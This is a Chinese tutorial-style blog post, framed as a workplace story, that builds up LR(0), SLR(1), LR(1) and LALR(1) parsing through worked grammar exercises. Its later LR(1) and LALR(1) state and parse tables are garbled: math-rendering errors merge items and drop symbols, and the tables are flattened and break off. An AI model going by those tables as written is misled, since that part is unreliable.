<p>那我现在就应该反过来，在扫描过程中一旦从我手上已读入的内容中识别出了某条产生式的右部，那就进行归约呗！</p>
<p>产生式右部，这名字太长了，换个什么名字好呢。。它们就像是被识别句子的把柄一样，干脆就叫这些东西做句柄吧！</p>
<p>好好好，现在问题就变成了，怎么在扫描的过程中识别句柄呢。。？</p>
<p>等一下，识别识别，之前词法分析器识别的是单词，那能不能魔改一下DFA，让它从识别符号串构成的单词，变成识别由单词串组成的句子？？</p>
<p>“还真别说，原理上完全可行啊，DFA核心也就是只要走到终态就成功识别，现在只要把激励从单纯的终结符变成和非终结符的并集，好像就能搞定啊！”午饭时间，师傅简单听了一下方案汇报，立马就给予了肯定。</p>
<p>“就是我感觉有几个小问题，你想想咋个解决。</p>
<p>首先，你刚刚不是说这个句柄是组装着突然发现的么，那我就当你是不断地扫描新符号，规约交替进行。但在马上就要组装出来的句柄之前，感觉有很大可能会有一些和这个句柄毫无关系的符号存在于你的识别缓存区中。</p>
<p>按照DFA的逻辑，只能是从开始符号接受正确的激励，只有能到达终态才叫做识别成功。那现在有一些无关的符号在你要识别的句柄之前，你就需要想出来一个机制去排除这些额外符号的干扰。或者说，即使有这些不相干符号提前给状态机一些无关的激励，也能让他最后识别正确。</p>
<p>第二个问题，你之前不是说过要有层次结构就必须要有栈么，那现在栈到哪里去了？先这么多吧，我稍后还有个会，先撤了。”说罢便匆匆离去了。</p>
<p>对啊，栈去了哪里呢？等一下，识别缓冲区？对啊，这不就是那个栈么！符号一个一个压入缓冲区里面，然后要是满足规约条件，就把这些符号组装成，或者说归约成一个非终结符，组装出来的东西就还是出现在缓冲区指示器的顶端，这不就是栈的后进先出嘛！</p>
<p>这么说来，和单纯的DFA相比，现在就是多了一个栈来保存过往的路径以及当前的状态！</p>
<p>那只剩下师傅说的那个问题了：怎么确保在初态不确定的前提下还能在合适的激励下走到终态呢？</p>
<p>等一下，初态真的不确定吗？？</p>
<p>如果按照之前LL(1)里面First集合的思路，First(S)总能把句子头部可能出现的单词给求出来；而Follow(β)总能把这个符号后面可能有哪些符号给算出来，而且还很大可能不是符号表的全集。</p>
<p>这说明，符号之间的前后顺序肯定有关联的，也就是说，句柄前面的符号应该也是能计算出来的！</p>
<p>那如果，我能提前计算出，从句首一直到句柄开始前会有哪些先导的符号，然后把这个状态作为识别句柄的开始状态，接着拼接那个识别具体句柄的DFA，不就解决了这个问题了？？</p>
<p>所以接下来，就应该把所有状态都列出来，再找出他们的相互关系。</p>
<h3 data-id="heading-2">3. 进度条=产生式+指示器=状态</h3>
<p>既然知道大方向是要算出来特定句柄的前缀，那么就老方法，从简单例子那里总结吧。出来吧随机文法生成器！</p>
<p>习题1：文法G[E]</p>
<pre><code class="hljs language-css" lang="css">E→aAc 
<span class="hljs-selector-tag">A</span>→<span class="hljs-selector-tag">b</span>
</code></pre>
<p>毫无头绪的时候，人就喜欢乱点鼠标。</p>
<p>鼠标在a的左边点击一下，闪呀闪呀。按一下右键，按一下右键。。。</p>
<p>Emm，怎么感觉 ，这个扫描、组装的过程，完全就是光标扫描的过程：</p>
<p>就像是，一开始有一个光标从a的左边开始闪烁，然后接受一个a之后，光标移动一下；来到A之后，光标在第二行左边开始闪烁。这个时候上下两层平行世界都在等待各自想要的符号。然后b读入之后，A的这个式子的光标移到了最右边，这个b归约成A，第一条式子心心念念的A这不就拿到了，最后再加上c，结束。</p>
<p>如果把“E-&gt;|aAc”看作是一个时刻，接收完a之后的场合明显不一样了，那就可以看作是发生了状态转移，变成“E-&gt;a|Ac”！然后这个时候由于要进入A这个子程序，这个时候的状态似乎就应该包括这个子函数的产生式组装进度。</p>
<p>对啊，指示符在串中有不同位置，这完全就是个进度条！而进度条本身就可以代表状态，那么只要把句柄出来之前的状态全部列出来，就可以把DFA拼凑完整了。不过这个竖线光标也太容易和字母l或者或 | 混淆了。还是用个间隔号 “·”来做进度指示器吧！</p>
<p>所以，对于同一个产生式的两个不同进度条</p>
<p>a. X→X_1 X_2…X_(i-1) · X_i X_(i+1)…X_n</p>
<p>b. X→X_1 X_2…X_(i-1) X_i · X_(i+1)…X_n</p>
<p>可以把它们看作是不同的状态。</p>
<p>如果X_i是终结符, 意味着当处于状态a时，则只需读取X_i，就会让状态a跳转到状态b；此外，两个状态之间应连一条标记为X_i的弧</p>
<p>如果X_i是非终结符，意味着当处于a状态时，需要进入到X_i的子程序中。</p>
<p>假设存在如下以X_i为左部的产生式：</p>
<p>c. X_i→·ab</p>
<p>d. X_i→·ac</p>
<p>e. X_i→·bc</p>
<p>意味着X_i可能存在多个分支。而这些产生式实际上与b一样都处于同样的状态。</p>
<p>因此与a产生式处于同一个状态的进度条有a、c、d、e四条。</p>
<p>假设该状态为A，且系统正处于状态A。</p>
<p>则当输入符号a时，所有可以处理符号a的产生式进度都会更新，进入只包含以下两条进度条的状态B：</p>
<p>f. X_i→a·b</p>
<p>g. X_i→a·c</p>
<p>意味着所有不能处理a的产生式全部消失。</p>
<p>当某个进度条到达100%，也就是进度条指示器到达了最右边，意味着前面的零件已经足以组装成产生式左部的非终结符，之后就可以把缓冲区中所有符号用于归约，并得到新的非终结符X_i。</p>
<p>由于此时相当于从子程序中返回，应该回到调用子程序的位置，也就是状态A。</p>
<p>意味着：状态A获得了非终结符X_i，X_i进入符号栈；而只有a进度条可以处理X_i，因此更新后得到状态b。</p>
<p>啊！！爽！！！又多一个神奇算法了，叫什么好呢。。</p>
<p>首先它也是从左到右(Left to right)扫描，也给一个L开头吧；然后每次都是把当前输入串的最右（Rightmost）句柄进行归约；然后完全不用像LL(1)那样往前看哪怕1个符号。。那就叫它LR(0)分析法吧！</p>
<h3 data-id="heading-3">4. 盲目的LR(0)分析法</h3>
<h4 data-id="heading-4">4.1 拓广文法</h4>
<p>来来来，赶紧打铁趁热试试别的案例。</p>
<p>习题2：分析串a#在文法G[S]下的语法树</p>
<pre><code class="hljs language-css" lang="css">S→<span class="hljs-selector-tag">A</span>|<span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">A</span>→S
</code></pre>
<p>首先，这是个以S为开始符号的文法，那么就从S的产生式为始，写出来相关的进度条。而由于S→·A需要进入A这个子程序，所以还要加上一条A→·S。啊等一下，接下来又由于A调用S这个子程序。。还写吗？算了先不写吧，反正写了跟上面两条也是一样的。</p>
<p>然后，对状态0中的每个进度条挨个施加不同的激励，生成新的子状态，得到状态1、2、3。</p>
<pre><code class="hljs language-css" lang="css">状态<span class="hljs-number">0</span>： S→·<span class="hljs-selector-tag">A</span> S→·<span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">A</span>→·S 
状态<span class="hljs-number">1</span>： S→<span class="hljs-selector-tag">A</span>· 
状态<span class="hljs-number">2</span>： S→<span class="hljs-selector-tag">a</span>· 
状态<span class="hljs-number">3</span>： <span class="hljs-selector-tag">A</span>→S·
</code></pre>
<p>从状态A开始，读入一个符号a，跳转到状态C；既然C的进度条已经满了，那就直接归约成S了呗。。等一下，那我现在应该在。。状态0，获得了S。。接下来我是该跳到状态3，还是直接结束？？假如跳到状态3，就又会经历归约，状态0遇到A。。这不循环了吗？？啥时候是个头？</p>
<p>哎，既然a后面都跟着句子结束符#，那就应该直接结束才对。</p>
<p>估计这文法存在自环的还不是个例，得想个通用方法来处理。</p>
<p>要不这样吧，每次分析前，为所有文法加上一句：S'→·S#作为初始进度条。这样一旦归约出了S，状态就会跳转成S'→S·#。接下来如果看到输入串已经结束，那就表示算法结束。</p>
<p>这么修改之后，开始符号S’只出现一次，这样就避免循环啦。</p>
<p>修改之后的文法比原来拓展增广了一个产生式，干脆就叫他拓广文法吧！</p>
<h4 data-id="heading-5">4.2 LR(0)的完整运行架构构建</h4>
<p>从初始文法G[S]开始，先对其进行拓广，增加新产生式，文法变成G[S']。</p>
<p>然后通过对初始产生式S'→·S#开始处理：</p>
<ul>
<li>
<p>如果点在非终结符(假设为A)旁边，就把子程序A的初始进度条加入到这个状态中；</p>
</li>
<li>
<p>如果点在终结符旁边，那就是在等待发现符号a；</p>
</li>
</ul>
<p>在上述操作无法创造新产生式之后，就对这个状态中施加可以处理的符号作为激励，从而得到新的状态进度条；原状态中不能处理这些激励的，在新状态中消亡。</p>
<p>由于每个状态都包含了多个进度条，就叫他们做进度条集合；而通过这样不断施加激励，生成的都是它的兄弟姐妹，所有的状态构成的集合就叫他们进度条集合大家族吧！</p>
<p>有了状态之间的跳转关系，为了方便查表，肯定要弄一个类似状态转移表那样的东西出来啦。算了，为了做区分，还是把这个表叫做LR(0)分析表吧。</p>
<p>首先把状态写到第一列上，把对应的终结符、终结符和#写到第一行去。接下来，如果状态A遇到符号a实现了正常的状态跳转，就在对应的格子中直接填写对应的数字；如果那个状态对应的是归约操作，那就直接为整行都覆盖同一个标记，这个标记的首字母是归约的首字母r，其后跟着对应产生式的序号，这样就可以知道是用第几条式子归约。最后，对于S'-&gt;S·#这一条，在#下面对应的格子里填上acc(ept)，表示语法分析结束，句子被接受。</p>
<p>运行的时候最重要的两个东西，一个是当前状态从哪个状态来的历史记录，一个是我手上有什么符号。</p>
<p>那干脆，这些东西全都用栈来记录吧！Emm，好像有点问题。状态我可以用整形来存，符号是字符型变量，两边搞到同一个数据结构去太烦了，干脆拆成两个不同数据类型的栈好了。</p>
<p>等一下，系统一开始要处于初态0，这个时候没有输入符号，两边对不上了呀！算了，反正也是占位符，加一个#在状态0对应的符号栈那里。这样结束的时候符号栈上正好是#S，加上还没有输入的#，正好构成了#S#，完美对称。</p>
<p>好好好，可以跟老板汇报了！</p>
<h4 data-id="heading-6">4.3 命名权：归老板所有</h4>
<p>老板听完了汇报，点点头表示认可。</p>
<p>然而师傅敏锐注意到，老板每每听到进度条、进度条集合、进度条集合大家族的时候，都会不自绝地皱眉。于是他试探到，“老板，我感觉进度条这几个词的起名好像不够高大上，要不您用您跨学科思维给小年轻打个样？”</p>
<p>老板不好意思笑笑“倒也没啥太好的想法，我就觉着这进度条这名字太长了。我看它本身也就像文章里面那些item一样一直往后列，干脆就叫项吧？”</p>
<p>好好的进度条被改口叫个不知所谓的项，表情一个不小心没控制住。还好师傅眼疾手快，赶紧碰了碰提醒了下，才恢复了表情管理。</p>
<p>“然后是大家族这个词确实太，接地气了。我学复分析的时候记得里面有个叫规范族的概念。我看你这个所谓家族也是按照一定规范构建的，干脆就叫项目集规范族怎么样？”</p>
<p>这一点倒是没意见。哎，反正命名啥的你爱叫啥叫啥吧。</p>
<p>“这样，你交给测试部门测一下，看看这玩意儿的通用性如何。好好过个周末吧！”</p>
<h4 data-id="heading-7">4.4 项的分类与冲突</h4>
<p>周一，刚到办公室，发现测试部门的报告已经呈上来了。</p>
<p>LR(0)的测试报告</p>
<p>本报告使用提交的LR(0)文法对定义变量的已拓广文法进行了分析：</p>
<p>(习题3)</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-number">0</span><span class="hljs-selector-class">.S</span>′→S 
<span class="hljs-number">1</span><span class="hljs-selector-class">.S</span>→<span class="hljs-selector-tag">tD</span> 
<span class="hljs-number">2</span><span class="hljs-selector-class">.D</span>→D,<span class="hljs-selector-tag">i</span> 
<span class="hljs-number">3</span><span class="hljs-selector-class">.D</span>→<span class="hljs-selector-tag">i</span>
</code></pre>
<p>在构建项目集规范族的过程中，发现其中有一个状态，同时存在两个冲突的操作：</p>
<pre><code class="hljs language-css" lang="css">S→rD· D→D·,<span class="hljs-selector-tag">i</span>
</code></pre>
<p>可以看出，该状态既可以直接进行归约，也可以等待下一个逗号的移入。</p>
<p>如果直接归约，则永远无法解析形如int a,b的串；</p>
<p>如果忽略归约，直接等待移入，则其他状态都无法归约出S，导致算法无法结束。</p>
<p>鉴于LR(0)分析方法未能解析常见的变量定义语法，其在使用上存在较大限制。</p>
<p>测试结论：不通过。如需要详细测试数据可联系工作号**********。</p>
<p>看完报告，心凉了半截，脑子里只有一个想法：什么鬼，模版上的星星都不删干净就交出来了么，就这细致程度还好意思说LR(0)不好用么 。</p>
<p>唉算了，这次确实是我这边没测好就交导致的。知耻而后勇，看看能不能举一反三把其他类似问题一起找出来。。</p>
<p>现在的问题应该是我之前只考虑了状态中只会有一个进度条满了可以归约，但其实还有可能出现其他可能的操作，包括但不限于，等待下一个终结符，非终结符。。怎么感觉情况很杂的样子。。</p>
<p>算了，要不我先根据圆点的位置和后续符号对项分类看看：</p>
<p>1.移进项目: 形如A→α·aβ,a∈V_T的项。</p>
<p>2.待约项目: 形如A→α·Bβ,B∈V_N的项目,表明要等待后续串归约成B之后才能继续分析。</p>
<p>3.归约项目: 形如A→α·的项目。它表明一个产生式右部即句柄α已形成,可归约成A。</p>
<p>4.接受项目: 形如S’→α · #的项目,表明语法分析完成。</p>
<p>哦哦，一共才四类嘛，并没有想象中的那么复杂。</p>
<p>那再试着总结一次：</p>
<p>LR(0)只能处理项目集中单单只有一个归约的情况。</p>
<p>假如除了归约项目以外还有移进项目，那么就会导致移进-归约冲突；</p>
<p>假如项目集中有两个或以上归约项目，那么可以肯定的是，这些项目的左部肯定不一样，那对于要用那条式子进行归约就又成问题了。对于这类问题，称为归约-归约冲突吧。</p>
<p>假如除了归约项目外还有待约项目，那这个待约项目首先会被当作子程序处理，生成新的移进项目或者待约项目；对其中的待约项目又会重复循环，直到全部生成了新的移进项目或类似A-&gt; ·这样的空串产生式对应的归约项目，那就又对应回上面两类冲突。因此，不存在归约待约冲突。</p>
<p>假如项目集中除了归约项目外还有接受项目，这种情况嘛，当然是结束优先，不存在冲突！</p>
<p>等一下，会不会有移进-移进冲突？？</p>
<p>应该不会吧。。？移进移进冲突不就是说有多条移进项目么。这些项目在遇到处理不同的符号自己就会挂掉了，还冲突个啥啊。</p>
<p>再想深一层，这些冲突的核心到底是什么？</p>
<p>我倒是知道政治老师教过现实中冲突的核心无非就是资源的争夺╮(￣▽￣)╭。总不能这句话也能用在这里吧。。哎？还真别说，如果把归约对应的动作在于把符号栈的元素出栈，如果把这些符号拼装成终结符，就再也回不去了。无论后面再来些什么符号，也没法拼装出正确的非终结符，这就解释了两种冲突。同时，这个也可以解释为啥不存在移进移进冲突了：那些符号都在栈上，一切都可逆，所以就没有冲突啦！</p>
<p>总结起来就是一句话：归约导致了栈上面的符号回不去，所以一旦在这个状态中无法区分自己到底应该是要移入，还是选择哪些特定的符号进行归约，就会出现相应的冲突。</p>
<h3 data-id="heading-8">5. 粗粒度与细粒度：Simple LR(1) 与 LR(1)，</h3>
<h4 data-id="heading-9">5.1 LR(0)的升级思路</h4>
<p>既然现在知道了一切的犹豫都来自于信息不足，那么改进的方向当然是让它获得更多信息啦。至于什么信息，（看看表）吃完午饭再想。</p>
<p>悠哉悠哉来到园区门口，恰巧目睹了一起争执：只见一辆丰田凯美瑞停在出场区这里，估计是外来车没登记，要等待保安手动抬杆。没想到那保安的脸色黑得吓人，跟那车子吼了几声，说的“不要按喇叭，我们会给你开的。”司机似乎是一脸懵，回复说“我也妹按喇叭呀？”保安没好气说“昨天按喇叭的不是你吗？丰田银色凯美瑞，我都认到你了。”司机一脸无奈：“我今天第一天来啊，你说的他的车应该不会也是粤E的吧？”貌似这个时候保安才留意到车牌这回事，看了一眼，没搭话，车也就开走了。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b42c820ba7049d2ad3dc1ba6530cb52~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pCe56yR5YO15bC45oCd6ICD5pe26Ze0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771550852&amp;x-signature=1b6YClU0Tj6tG8sPnUS8NjeaqM0%3D" alt="" loading="lazy"/><img alt="" title="点击并拖拽以移动" src="" loading="lazy"/>​<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c967414f318e4cb18e2f5ac3a462e923~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pCe56yR5YO15bC45oCd6ICD5pe26Ze0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771550852&amp;x-signature=b6%2F7gZtBEAHwn74iwG8lUoxMB%2BU%3D" alt="" loading="lazy"/></p>
<p>吃饭的时候跟师傅聊起这茬，师傅感慨道：“说句政治不正确的话，有时候真不由得感慨，某些人的职位真的对得起他的智商。你说他记不住车牌也就算了，居然连粤E粤S都完全不分，还那么情绪化，难怪口碑一直都那么差。假如他能稍稍能聪明一点，在摆臭脸之前稍稍看一下这个车的来源，估计也没这么尴尬。”</p>
<p>说者无心听着有意：既然现在LR(0)需要更多的信息，往往就是不知道归约的时机对不对，就像是那个保安，眉毛胡子一把抓，看到银色丰田凯美瑞就摆臭脸，那肯定不行。既然现在要归约成特定非终结符,比如A，那如果发现后面的符号a确实好在Follow(A)之中，又不会有其他移进符号等待这个符号a，那就可以直接进行归约而无需纠结啦；相反，如果这个符号a被其他移进项目虎视眈眈，但又不在Follow(A)之中，那也可以马上确定就是要先处理移进项目。这样冲突就解决啦。</p>
<p>师傅听完，点评道：“我是看那保安可能记忆力有限才让他只记住前两位，假如他记忆力够何不直接记车牌？那多精准。</p>
<p>回到你的算法上，现在又没有成本限制，你何不让这算法一步到位？</p>
<p>假如有S=&gt;*αAβ_1，S=&gt;*αAβ_2，那你的Follow(A)实际上就对应于First(β_1)∪First(β_2)。如果你直接给A的每一条产生式求它之后出现的β_1的First集合，那就能区分得更细，遇上冲突的概率肯定要比你Follow(A)要低。”</p>
<p>（想了好一阵）要不，我还是两个都实现一下，弄两个不同精度的算法。这样复杂的文法用复杂的算法分析，简单的就用简单的应付，这样成本啥的也不至于太高。师傅你说的那种高精度算法，由于总要往前看一个符号，干脆就直接叫LR(1)；而求Follow的版本，算是LR(1)的简化版，干脆就叫SLR(1)。</p>
<p>师傅赞赏地点点头，“你这让我我想起鲁迅的一句话：人的智能，就体现在会根据不同成本创造和使用合适的工具！”</p>
<p>我也想起鲁迅说的另一句话，“我没说过”。哈哈哈哈哈哈</p>
<h4 data-id="heading-10">5.2 粗粒度的SLR(1)</h4>
<p>总结下来，SLR(1)的核心也就是这么一段话：</p>
<p>如果某个项目集I={X→α·bβ, X→α·cβ, A→γ·, B→δ·}, 对于输入符号x有：</p>
<ol>
<li>
<p>若x∈{b,c},移进；</p>
</li>
<li>
<p>若x∈FOLLOW(A),则用产生式A→γ规约</p>
</li>
<li>
<p>若x∈FOLLOW(B),则用产生式B→δ规约</p>
</li>
<li>
<p>若x不在这三个集合中，则句子有错</p>
</li>
</ol>
<p>如果3个集合互有交集，则说明这种思路无法处理冲突，这个文法就不是SLR(1)文法。</p>
<p>相比于LR(0)，只要在有冲突的集合中，多计算一下归约项目中等待被归约的非终结符的Follow集合，只要和其他移入项目归约项目不冲突，那就完事了。</p>
<p>由于SLR(1)没有改变构建项目集规范族的方式，所以原来的LR(0)项目集规范族这个名字倒还可以继续用，就是那个LR(0)分析表得改名叫做SLR(1)分析表了。</p>
<p>毕竟，原来的LR(0)分析表最大的特点就是一旦到了某个需要归约的状态后，就不管三七二十一整行都填满rx。现在相当于更细化了，只有Follow(A)中的符号才需要填rx，其次就是根据移进项目在对应的格子中填写要跳转的项目。</p>
<h4 data-id="heading-11">5.3 细粒度的LR(1)</h4>
<p>比SLR(1)只在归约的时候只计算全局性的Follow(A)更进一步的，是LR(1)需要在每次归约的时候都得知道接下来跟着当前产生式的是什么符号，而这个信息是局部的。</p>
<p>比如，对于S'→S#, 谜底就在谜面上，只有当看到#，才能进行接受；</p>
<p>再比如，假如有第二条产生式S→Ab，那么假如要归约成S，就需要看到上一条表达式中S后面的符号，也就是#；</p>
<p>又比如，假如有第三条产生式A→a，那么根据前面一条产生式可知，这条A能归约的条件就是看到b。</p>
<p>要注意的是，尽管归约条件只有在归约的时候才会真正被用到，但由于要计算的信息是局部性的而不是像Follow那样的全局性，因此只有在计算LR(1)项目集规范族的时候把归约所需条件层层传递，才能让这些信息到达有需要的项中。</p>
<p>另外比较容易发现的是，即使这个产生式带了进度指示器，它的归约条件也不会变化。</p>
<p>后面为了规范化，将以类似“A→α·Bβ,a”的格式来表示某个项及其归约条件。其中逗号为间隔符。</p>
<p>我已想到一种类似于DFA探索地图一样绝妙而简便的方法，从而不混乱地进行LR(1)项目族规范族的构建。所幸这里有大把空间，可以用如下已拓广文法为例进行说明：</p>
<p>(习题4)</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">0.</span> S′→S$ 
<span class="hljs-bullet">1.</span> S→BB 
<span class="hljs-bullet">2.</span> B→aB 
<span class="hljs-bullet">3.</span> B→b
</code></pre>
<p>首先为开始符号S'产生式生成带归约条件的项目：S′→·S, $。（这么说来S后面还真加不加#都没所谓，反正知道S'就是收到S看到句子结束符就acc就好。）</p>
<p>生成一个有四列的表格，如下所示。其中，第一行数据填上：状态名称：0；来源：空；初始项：S'→·S,<span class="math math-inline"><span class="katex-error" title="ParseError: KaTeX parse error: Expected '}', got 'EOF' at end of input: …子程序所增加项：{S→·BB," style="color:#cc0000"><span class="cjk_fallback">，以及求子程序所增加项：{S→·BB,</span></span></span>；B→·aB, a/b；B→·b, a/b}。</p>
<p>在初始条件准备妥当后，就开始循环：</p>
<p>每一轮中，对当前表格中还没被完全处理完毕的状态，找出它里面还没被处理的项，然后对这个项施加可以让它的进度发生变化的激励，如S、B等，从而产生新临时状态的初始项。如果这个初始项从未出现过，则确认为发现了新状态，记录在表格新的一列中。同时还可以在这个已处理的项后面标记接下来会进行的相应操作标记，从而防止重复处理该项，并方便后续LR(1)分析表的构建。</p>
<p>重复上述过程，直到没有新状态产生，所得项目集即为LR(1)项目集规范族。</p>
<p>状态名称</p>
<p>上一个状态(来源)</p>
<p>初始项</p>
<p>求子程序所增加项</p>
<p>0</p>
<p>S'→·S,$，1</p>
<p>S→·BB,$，2<br/>
B→·aB, a/b，3<br/>
B→·b, a/b，4</p>
<p>1</p>
<p>0</p>
<p>I1: S'→S·, $，acc</p>
<p>2</p>
<p>0</p>
<p>S→B·B,$，5</p>
<p>B→·aB, <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>，</mtext><mn>6</mn><mi>B</mi><mo>→</mo><mo separator="true">⋅</mo><mi>b</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">，6  
B→·b, </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord cjk_fallback">，</span><span class="mord">6</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">→</span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">b</span><span class="mpunct">,</span></span></span></span></span>，7</p>
<p>3</p>
<p>0, 3</p>
<p>B→a·B, a/b，8</p>
<p>B→·aB, a/b，3<br/>
B→·b, a/b，4</p>
<p>4</p>
<p>0, 3</p>
<p>B→b·,a/b，r3</p>
<p>5</p>
<p>2</p>
<p>S→BB·, $，r1</p>
<p>6</p>
<p>2, 6</p>
<p>B→a·B,$，8</p>
<p>B→·aB,<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>，</mtext><mn>6</mn><mi>B</mi><mo>→</mo><mo separator="true">⋅</mo><mi>b</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">，6  
B→·b,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord cjk_fallback">，</span><span class="mord">6</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">→</span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">b</span><span class="mpunct">,</span></span></span></span></span>，7</p>
<p>7</p>
<p>2, 6</p>
<p>B→b·,$，r3</p>
<p>8</p>
<p>3</p>
<p>B→aB·,a/b，r2</p>
<p>9</p>
<p>6</p>
<p>B→aB·,$，r2</p>
<p>接下来就可以构建相应的LR(1)分析表了</p>
<p>a</p>
<p>b</p>
<p>$</p>
<p>S</p>
<p>B</p>
<p>0</p>
<p>3</p>
<p>4</p>
<p>1</p>
<p>2</p>
<p>1</p>
<p>acc</p>
<p>2</p>
<p>6</p>
<p>7</p>
<p>5</p>
<p>3</p>
<p>3</p>
<p>4</p>
<p>8</p>
<p>4</p>
<p>r3</p>
<p>r3</p>
<p>5</p>
<p>r1</p>
<p>6</p>
<p>6</p>
<p>7</p>
<p>8</p>
<p>7</p>
<p>r3</p>
<p>8</p>
<p>r2</p>
<p>r2</p>
<p>9</p>
<p>r2</p>
<h4 data-id="heading-12">5.4 LALR(1): LR(1)的成本优化方案</h4>
<p>我去，终于写完这10个状态了，LR(1)分析实在是太繁琐了，这工作是给人类做的吗？？要不是非要写文档，这工作机器做绝对比人强啊！</p>
<p>而且话说回来，上面这个文法中的状态4和7，状态8和9，以及状态3和6，他们除了归约条件不同以外所有项都一样的呀。这相比于LR(0)的项目集规范族，完全就是脱裤子放屁啊。</p>
<p>既然前面都试过用奥卡姆剃刀来化简状态，那LR(1)的状态估计也是可以被美容一下的。</p>
<p>状态名称</p>
<p>上一个状态(来源)</p>
<p>初始项</p>
<p>求子程序所增加项</p>
<p>0</p>
<p>S'→·S,$，1</p>
<p>S→·BB,<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>，</mtext><mn>2</mn><mi>B</mi><mo>→</mo><mo separator="true">⋅</mo><mi>a</mi><mi>B</mi><mo separator="true">,</mo><mi>a</mi><mi mathvariant="normal">/</mi><mi>b</mi><mi mathvariant="normal">/</mi></mrow><annotation encoding="application/x-tex">，2  
B→·aB, a/b/</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord cjk_fallback">，</span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">→</span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mord">/</span><span class="mord mathnormal">b</span><span class="mord">/</span></span></span></span></span>，3,6<br/>
B→·b, a/b/$，4,7</p>
<p>1</p>
<p>0</p>
<p>I1: S'→S·, $，acc</p>
<p>2</p>
<p>0</p>
<p>S→B·B,$，5</p>
<p>B→·aB, a/b/<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>，</mtext><mn>3</mn><mo separator="true">,</mo><mn>6</mn><mi>B</mi><mo>→</mo><mo separator="true">⋅</mo><mi>b</mi><mo separator="true">,</mo><mi>a</mi><mi mathvariant="normal">/</mi><mi>b</mi><mi mathvariant="normal">/</mi></mrow><annotation encoding="application/x-tex">，3,6  
B→·b, a/b/</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord cjk_fallback">，</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">6</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">→</span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mord">/</span><span class="mord mathnormal">b</span><span class="mord">/</span></span></span></span></span>，4,7</p>
<p>3,6</p>
<p>0, 3</p>
<p>B→a·B, a/b/$，8</p>
<p>B→·aB, a/b/<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>，</mtext><mn>3</mn><mo separator="true">,</mo><mn>6</mn><mi>B</mi><mo>→</mo><mo separator="true">⋅</mo><mi>b</mi><mo separator="true">,</mo><mi>a</mi><mi mathvariant="normal">/</mi><mi>b</mi><mi mathvariant="normal">/</mi></mrow><annotation encoding="application/x-tex">，3,6  
B→·b, a/b/</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord cjk_fallback">，</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">6</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">→</span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">a</span><span class="mord">/</span><span class="mord mathnormal">b</span><span class="mord">/</span></span></span></span></span>，4,7</p>
<p>4,7</p>
<p>0, 3</p>
<p>B→b·,a/b/$，r3</p>
<p>5</p>
<p>2</p>
<p>S→BB·, $，r1</p>
<p>8,9</p>
<p>3</p>
